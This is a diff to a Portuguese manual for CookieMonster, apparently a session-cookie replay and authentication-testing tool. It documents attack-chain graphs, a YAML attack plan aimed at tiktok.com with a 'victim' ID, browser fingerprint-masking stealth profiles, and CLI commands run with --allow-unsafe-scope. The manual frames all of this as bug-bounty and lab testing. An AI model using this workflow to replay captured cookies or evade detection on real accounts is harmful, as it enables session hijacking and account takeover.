+| SESSION_CONTEXT_BOUND | | requires DEPENDENCY_INFERRED | Context requer dependency |
+
+### OPT-A: AttackChain (caminho de impacto)
+
+`build_chains()` percorre o grafo via DFS seguindo edges ENABLES ate endpoint de auth, gerando **AttackChains** com severity, confidence, e summary human-readable.
+
+**Exemplo de render**:
+```
+ATTACK CHAIN (3 findings, 2 edges)
+============================================================
+[CRITICAL] auth_state_confirmed       (conf 0.95) @x.com run#100
+      |
+      v  --enables-->
+[CRITICAL] protected_resource          (conf 0.90) @x.com run#100
+============================================================
+IMPACT: CRITICAL (0.95)
+  Cookie artifact capturado -> sessao autenticada confirmada
+```
+
+## 12. M7 AttackPlan — Orquestração declarativa YAML
+
+Em vez de chamar `probe`, `probe-all`, `matrix`, `correlate` separadamente, descreva o **plano** em YAML e o executor monta a cadeia.
+
+### Schema YAML
+
+```yaml
+# Alvo obrigatorio.
+target: tiktok.com
+
+# Vitima especifica (opcional; default = melhor para o target).
+victim: 2390
+
+# Phases a executar em ordem.
+# Validas: discover, classify, replay, observe, correlate
+phases:
+  - discover
+  - classify
+  - replay
+  - observe
+  - correlate
+
+# Configuracao da fase replay.
+replay:
+  # Transports validos: http, browser
+  transports: [http, browser]
+  # Variantes de contexto (subset de M6.2). default sempre incluso.
+  context_variants: [default]
+  # Timeout maximo para readiness (ms).
+  max_wait_ms: 10000
+  # Maximo de vitimas a processar (0 = todas).
+  max_victims: 10
+  # Workers paralelos (Playwright pesado: max 4).
+  workers: 3
+  # Quando parar a fase replay cedo.
+  # Validos: authenticated, blocked, inconclusive
+  stop_when: authenticated
+
+# Stop conditions globais (parar o plano inteiro).
+# Validos: authenticated, blocked, inconclusive
+stop_conditions:
+  - authenticated
+  - blocked
+
+# Metadata arbitraria para o report.
+metadata:
+  operator: redteam@example.com
+  authorization: bug-bounty-program/123
+  notes: Primeiro probe contra a API endpoint para reduzir custo de browser.
+```
+
+### Exemplo completo
+
+Veja `docs/examples/attack-plan.example.yaml`.
+
+### Impact Assessment
+
+Apos executar, o plano gera um **ImpactAssessment** com severity (INFO/LOW/MEDIUM/HIGH/CRITICAL) baseado nos findings:
+
+| Severity | Quando |
+|---|---|
+| CRITICAL | AUTHENTICATED real |
+| HIGH | MFA_BLOCKED, BOT_BLOCKED, REJECTED com anti-bot |
+| MEDIUM | IDP_BOUND, CONTEXT_BOUND |
+| LOW | REJECTED (sessao invalida) |
+| INFO | Sem dados suficientes |
+
+## 13. OPT-B StealthProfile (Canvas/WebGL/Font)
+
+**Stealth nao implementa bypass** — apenas reduz o fingerprint do navegador para evitar deteccao passiva. Use apenas em lab com autorizacao.
+
+### Como funciona
+
+`StealthProfile` injeta JavaScript via `context.add_init_scripts()` no Playwright **antes** de qualquer pagina carregar:
+
+- **Canvas noise** (`HTMLCanvasElement.prototype.toDataURL`): randomiza pixels minimos no canvas fingerprint.
+- **WebGL mask** (`getParameter(37445/37446)`): retorna `"Intel Inc."` independente da GPU real.
+- **Font mask** (`navigator.fonts`): retorna stub em vez de enum de fontes instaladas.
+
+### 3 profiles built-in (opt-in)
+
+```python
+from cookiemonster.stealth import list_builtin_profiles
+profiles = list_builtin_profiles()
+# "lab-canvas-noise" (risk=low)
+# "lab-webgl-mask" (risk=low)
+# "lab-full-stealth" (risk=medium, canvas+webgl+font)
+```
+
+### Custom profile (YAML/JSON)
+
+```json
+{
+  "name": "custom",
+  "description": "Canvas + UA override",
+  "risk": "low",
+  "required_authorization": "lab",
+  "canvas_noise": true,
+  "ua_override": "Mozilla/5.0 (custom) AppleWebKit/537.36"
+}
+```
+
+### Uso
+
+```bash
+# Profile built-in
+python -m cookiemonster probe --domain tiktok.com \
+  --stealth-profile ~/.config/cookiemonster/stealth/lab-canvas-noise.json \
+  --allow-unsafe-scope
+
+# Custom profile
+python -m cookiemonster probe --domain tiktok.com \
+  --stealth-profile ./my-stealth.json --allow-unsafe-scope
+```
+
+**Aviso explicito** no terminal:
+```
+>>> STEALTH PROFILE ATIVO: lab-canvas-noise (risk=low)
+  Canvas fingerprint noise (adiciona ruido minimo)
+  Authorization: lab
+```
+
+### Validacao real (4 testes de browser)
+
+Confirmado que os scripts **realmente executam** no Playwright:
+- `toDataURL` retorna dados modificados (canvas noise OK).
+- `getParameter(37445)` retorna `"Intel Inc."` (WebGL mask OK).
+- `navigator.fonts.check('Arial')` retorna `True` (font stub OK).
+- `lab-full-stealth` aplica os 3 simultaneamente.
+
+## 14. OPT-C Regras YAML customizadas
+
+O operador pode estender as **9 regras default** com regras proprias via `~/.config/cookiemonster/rules.yaml` ou `--rules-file <path>`.
+
+### Formato
+
+```yaml
+rules:
+  - if: SESSION_ARTIFACT
+    then: enables SESSION_REPLAY
+    label: custom rule
+
+  - if: AUTH_BOUNDARY
+    and: [SESSION_REPLAY]
+    then: blocks PROTECTED_RESOURCE
+    label: idp blocks resource access
+```
+
+### Uso
+
+```bash
+# ~/.config/cookiemonster/rules.yaml (carregado automaticamente)
+python -m cookiemonster correlate --limit 10
+
+# Custom file
+python -m cookiemonster correlate --rules-file my-rules.yaml --limit 10
+```
+
+Quando regras custom sao carregadas:
+```
+OPT-C: 2 regras customizadas carregadas (total: 12)
+```
+
+### Validacao
+
+- `if` ausente → erro.
+- `then` invalido (sem `kind`) → erro.
+- `FindingType`/`EdgeKind` invalidos → erro com lista de validos.
+
+## 15. OPT-D Lab Profiles A–G
+
+7 ambientes **propositalmente vulneraveis** para validar deteccoes CookieMonster em condicoes controladas. O target (servidor) eh um projeto separado; este modulo define as **expectativas**.
+
+| Lab | Protection | Expected Outcome | Variant recomendada |
+|---|---|---|---|
+| **A** | cookie_only | AUTHENTICATED | default |
+| **B** | cookie + IP binding | CONTEXT_BOUND | controlled_alternate |
+| **C** | cookie + device binding | CONTEXT_BOUND | preserved |
+| **D** | OAuth front-channel | IDP_BOUND | default |
+| **E** | OAuth + MFA | MFA_BLOCKED | default |
+| **F** | anti-bot challenge | BOT_BLOCKED | default |
+| **G** | rotating session | INCONCLUSIVE | default |
+
+### Acesso programatico
+
+```python
+from cookiemonster.lab import get_lab, list_labs, export_scenarios_json
+
+lab = get_lab("D")
+print(lab.protection, lab.expected_outcome)
+
+labs = list_labs()
+print(f"Total: {len(labs)} labs")
+
+# Exportar cenarios como JSON (para lab target externo)
+js = export_scenarios_json()
+open("scenarios.json", "w").write(js)
+```
+
+### Saida em `docs/labs/scenarios.json`
+
+```json
+{
+  "version": "1.0",
+  "labs": [
+    {
+      "name": "Lab A - cookie only",
+      "protection": "cookie_only",
+      "expected_outcome": "authenticated",
+      "matrix_variant": "default"
+    },
+    ...
+  ]
+}
+```
+
+### Limitacoes
+
+- OPT-D **nao implementa** o lab target. A implementacao do servidor que produz cada comportamento eh um projeto separado.
+- O modulo `lab/` apenas **documenta as expectativas** para o CookieMonster.
+
+## 16. Estrutura do Projeto
+
+```
+cookiemonster/
+├── auth/         # M6.0 - AuthContext + Detector + Classification
+├── correlate/    # M6.3 + OPT-A - Finding canônico + grafo + AttackChain
+├── domain/       # M1 - RFC 6265 matcher
+├── ingest/       # M0 - parsers Netscape/JSON
+├── inject/       # M2 - httpx + Playwright clients
+├── lab/          # OPT-D - 7 lab profiles A-G
+├── plan/         # M7 - AttackPlan YAML + executor
+├── replay/       # M6.2 - ReplayMatrix + DependencyAnalyzer
+├── report/       # M4 - JSON/Markdown report
+├── stealth/      # OPT-B - StealthProfile opt-in
+├── store/        # SQLite persistence
+├── util/         # scope, PSL, helpers
+├── validate/     # M3 + M5 - detector + profiles
+└── cli.py        # 18 comandos CLI
+
+docs/
+├── MANUAL.md                  # este arquivo
+├── examples/
+│   └── attack-plan.example.yaml
+└── labs/
+    └── scenarios.json
+
+tests/                          # 232 testes pytest
+lab/
+└── sweep_all.py                # sweep paralelo
+scope.txt                       # allowlist
+README.md                       # quickstart
+```
+
+## 17. Onde Pedir Ajuda
 
 - **Issues**: https://github.com/skzun/CookieMonster/issues
-- **Documentação adicional**: `docs/ARCHITECTURE.md` (técnica), `ROADMAP.md` (roadmap), `CHANGELOG.md` (histórico)
-- **Lab mock**: `lab/mock_app.py` para testar offline sem rede real
+- **Documentacao**: este MANUAL + `docs/ARCHITECTURE.md`
+- **Exemplos**: `docs/examples/attack-plan.example.yaml`
+
+---
+
+**Versao do manual**: M7 + OPT-A-D (CookieMonster v1.0).
+**Ultima atualizacao**: ver git log.
+**Testes**: 232 verdes.
